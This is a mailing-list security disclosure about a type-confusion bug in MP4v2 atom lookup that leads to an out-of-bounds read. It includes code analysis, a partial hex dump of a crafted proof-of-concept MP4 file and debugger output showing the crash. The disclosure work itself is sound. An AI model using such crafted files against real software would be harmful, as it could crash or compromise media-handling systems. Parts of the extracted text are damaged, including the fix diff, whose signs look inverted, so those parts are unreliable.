  oss-security - Out-of-bounds memory access in MP4v2            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Wed, 18 Jul From: Ruikai Liu To: oss-security@...ts.openwall.com Subject: Out-of-bounds memory access in MP4v2  Hi,  A out-of-bounds memory access bug is found in MP4v2 a legacy library dealing with MP4 media file.  ========= find atom by type =========  The function `FindAtom` iterates the atom tree and find the target by comparing its type with the given one:   MP4Atom* MP4Atom::FindChildAtom(const char* name)  {      uint32_t atomIndex = 0;       // get the index if we have one, e.g. moov.trak[2].mdia...      (void)MP4NameFirstIndex(name, &atomIndex);       // need to get to the index'th child atom of the right type      for (uint32_t i = 0; i < m_pChildAtoms.Size(); i++) {          if (MP4NameFirstMatches(m_pChildAtoms[i]->GetType(), name)) {  ...  However, the comparison could be passed for an crafted atom which doesn't match in fact:   29 bool MP4NameFirstMatches(const char* s1, const char* s2)  30 {  31     if (s1 == NULL || *s1 == '\0' || s2 == NULL || *s2 == '\0') {  32         return false;  33     }  34  35     if (*s2 == '*') {  36         return true;  37     }  38  39     while (*s1 != '\0') {  40         if (*s2 == '\0' || strchr("[.", *s2)) {  41             break;  42         }  43         if (tolower(*s1) != tolower(*s2)) {  44             return false;  45         }  46         s1++;  47         s2++;  48     }  49     return true;  50 }  The above while-loop would exit and return true once `s1` ends early. For example, "abcd")` returns true, though an atom with type "abc\x00" should never be returned when finding atom of type "abcd".  Things are different when creating atoms. The 4-bytes type read from file is strictly checked to determine which atom constructor to use(src/mp4atom.cpp):               if( ATOMID(type) == ATOMID("sdtp") )                  return new MP4SdtpAtom(file);  The above difference between creating and finding atoms could result in type confusion, which leads to out-of-bounds memory access.  ========= MP4SdtpAtom =========  `FindAtom` is called to find an atom of type "sdtp" when generating the track info(src/mp4track.cpp):       // update sdtp log from sdtp atom      MP4SdtpAtom* sdtp = (MP4SdtpAtom*)m_trakAtom.FindAtom( "trak.mdia.minf.stbl.sdtp" );      if( sdtp ) {          uint8_t* buffer;          uint32_t bufsize;          sdtp->data.GetValue( &buffer, &bufsize );          m_sdtpLog.assign( (char*)buffer, bufsize );          free( buffer );      }  So if a crafted MP4 file contains an atom of type "sdt\x00", then this atom would be returned and cast to `MP4SdtpAtom`. But its actual class is not `MP4SdtpAtom` since strict comparison is used when creating the atom. As a result, `sdtp->data` is actually out of the object.  ========= POC =========  We build a MP4 file which contains the necessary fields. The atoms are arranged dedicatedly so that for 32-bits program, `sdtp->data` would access the trackID, which is controlled by us and would finally leads to reading from `0xdeadbeef`:  root@...ian:~# xxd c4.mp4  ....ftypmp42.... 6f6d 6d6f  mp42isom....moov     ................  ................  ................  ...............P  trak...`tkhd.... dead bed7  .4Vx#Eg.........  .vT2....AAAAAAAA  AAAAAAAAAAAAAAAA  AAAAAAAAAAAAAAAA  AAAAAAAAAAAAAAAA  AAAA....mdia....  .est... hdlrBBBB  BBBBBBBBBBBBBBBB  BBBB... mdhd....   ........minf....  .est....stbl....  stsz............  ........stsc....  ................  ....stco........  ....stts........  .............dt.  .....o64........            stsh....sdt.  Here's the result of running `mp4info` on it:  root@...ian:~# gdb /usr/bin/mp4info Reading symbols from /usr/bin/mp4info...(no debugging symbols found)...done. (gdb) r c4.mp4 Starting program: /usr/bin/mp4info c4.mp4 /usr/bin/mp4info version -r c4.mp4: ReadAtom: "c4.mp4": atom type est is suspect ReadAtom: "c4.mp4": atom type est is suspect ReadAtom: "c4.mp4": atom type dt is suspect ReadAtom: "c4.mp4": atom type sdt is suspect ReadChildAtoms: "c4.mp4": In atom stbl missing child atom stsd ReadChildAtoms: "c4.mp4": In atom minf missing child atom dinf  Program received signal SIGSEGV, Segmentation fault. in ?? () from (gdb) x/i $eip =>  mov    (%eax),%ecx (gdb) i r eax eax            0xdeadbeef        The binary we test is the mp4v2 package of Debian:  root@...ian:~# dpkg -s mp4v2-utils Package: mp4v2-utils Status: install ok installed Priority: optional Section: sound Installed-Size: Maintainer: Debian Multimedia Maintainers <pkg-multimedia-maintainers@...ts.alioth.debian.org> Architecture: Source: mp4v2 Version: Depends: (= libc6 (>= 2.4), libgcc1 (>= libstdc++6 (>= 5.2)  ========= fix =========  The bug can be fixed by more checks when doing type comparison. For example:  --- src/mp4util.cpp     +++     @@ @@          s1++;          s2++;      } -    if(*s2 != '[' && *s2 != '.' && *s2 != '\0') return false;      return true;  }  ========= Reference =========  [1] https://code.google.com/archive/p/mp4v2/ [2] http://xhelmboyx.tripod.com/formats/mp4-layout.txt  --  Best regards,  Ruikai Liu  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      